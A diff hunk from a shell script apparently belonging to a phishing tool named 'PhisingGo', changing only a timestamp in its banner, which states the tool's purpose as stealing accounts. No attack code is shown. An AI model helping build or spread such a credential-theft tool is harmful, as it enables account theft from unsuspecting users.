@@ -210,7 +210,7 @@ printf "\e[0;47;90;1m[              PhisingGo, My Github: @stepbyatepexe        
 toilet -f smslant 'PhisingGo'
 printf "
 Name        : PhisingGo
-Version     : 1.1 (Update: 30 January 2020, 3:31 AM)
+Version     : 1.1 (Update: 30 January 2020, 3:10 AM)
 Tanggal     : 20 July 2019
 Mod         : Nedi Senja
 Purpose     : Stealing accounts using the method
